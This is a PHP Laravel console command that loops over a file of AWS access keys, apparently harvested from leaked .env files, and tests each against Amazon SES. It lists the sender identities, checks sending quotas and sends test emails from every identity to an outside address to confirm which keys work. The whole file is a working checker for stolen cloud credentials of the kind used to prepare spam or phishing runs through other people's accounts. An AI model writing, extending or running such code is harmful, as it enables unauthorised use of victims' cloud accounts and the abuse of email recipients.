<?phpnamespace App\Console\Commands\Aws;use Illuminate\Console\Command;use Illuminate\Support\Arr;use M1\Env\Parser;use SimpleEmailServiceError;class SesCheckCommand extends Command{    protected $signature = 'aws:ses';    protected $description = 'Command description';    public function handle(): void    {//        $credentials = file_get_contents(base_path('results/aws.txt'));//        $credentials = explode('====================', $credentials);//        $credentials = collect($credentials ?? []);        $credentials = file('results/aws-ses.txt');        foreach ($credentials as $credential) {            try {                $credential = str($credential)->trim()->explode(',');//                $env = collect(Parser::parse(trim($credential)) ?? []);//                $AWS_ACCESS_KEY_ID = $env->get('AWS_ACCESS_KEY_ID');//                $AWS_SECRET_ACCESS_KEY = $env->get('AWS_SECRET_ACCESS_KEY');//                $AWS_DEFAULT_REGION = $env->get('AWS_DEFAULT_REGION', 'us-east-1');                $AWS_ACCESS_KEY_ID = $credential->get(0);                $AWS_SECRET_ACCESS_KEY = $credential->get(1);                $AWS_DEFAULT_REGION = $credential->get(2, 'us-east-1');                if (!$AWS_ACCESS_KEY_ID || !$AWS_SECRET_ACCESS_KEY) {                    continue;                }//                $creds = "{$AWS_ACCESS_KEY_ID},{$AWS_SECRET_ACCESS_KEY},{$AWS_DEFAULT_REGION}";//                file_put_contents(//                    base_path('results/aws-ses.txt'),//                    $creds . PHP_EOL,//                    FILE_APPEND//                );//                $this->info($creds, false);                $ses = new \SimpleEmailService(                    access_key: $AWS_ACCESS_KEY_ID,                    secret_key: $AWS_SECRET_ACCESS_KEY,                    region: $AWS_DEFAULT_REGION                );                $identities = $ses->listIdentities();                if ($identities instanceof SimpleEmailServiceError) {                    continue;                }                $sendingQuota = $ses->getSendQuota();                if ($sendingQuota instanceof SimpleEmailServiceError) {                    continue;                }                $sendMail = function ($identity) use ($ses) {                    $envelope = new \SimpleEmailServiceEnvelope(                        from: $identity,                        subject: 'Test',                        message: 'Test',                        htmlMessage: 'Test',                    );                    $envelope->addTo([                        'email' => 'me@supra.codes',                        'name' => 'Supra Codes',                    ]);                    return $ses->sendEmail($envelope);                };                if ($sendMail(Arr::first($identities)) instanceof SimpleEmailServiceError) {                    continue;                }                foreach ($identities as $identity) {                    $envelope = new \SimpleEmailServiceEnvelope(                        from: $identity,                        subject: 'Test',                        message: 'Test',                        htmlMessage: 'Test',                    );                    $envelope->addTo([                        'email' => 'me@supra.codes',                        'name' => 'Supra Codes',                    ]);                    $sendMail = $ses->sendEmail($envelope);                    ray(                        $AWS_ACCESS_KEY_ID,                        $sendMail                    );                }            } catch (\Exception $e) {                $this->error($e->getMessage(), false);                continue;            }        }    }}